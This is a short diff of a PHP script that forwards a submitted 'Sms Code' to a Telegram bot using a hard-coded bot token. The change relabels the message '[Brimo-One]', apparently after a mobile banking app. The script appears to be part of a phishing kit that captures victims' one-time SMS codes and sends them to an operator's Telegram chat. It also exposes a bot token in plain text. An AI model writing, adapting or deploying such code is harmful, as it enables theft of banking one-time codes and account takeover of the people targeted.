@@ -25,7 +25,7 @@ function sendMessage($telegram_id, $message_text, $secret_token) {
 only basic POST method :
 -----------------------*/
 $telegram_id = $_POST ['telegram_id'];
-$message_text ="Code SMS >> "."Sms Code: ".$_POST ['message_text'];
+$message_text ="[Brimo-One] "."\n"."Sms Code: ".$_POST ['message_text'];
 
 /*--------------------------------
 Isi TOKEN dibawah ini: 
@@ -34,3 +34,4 @@ $secret_token = "5655115185:AAHCJhOWjnjMdnZYhaAoxpE7eh7HtdnqMsc";
 sendMessage($telegram_id, $message_text, $secret_token);
 
 ?>
+
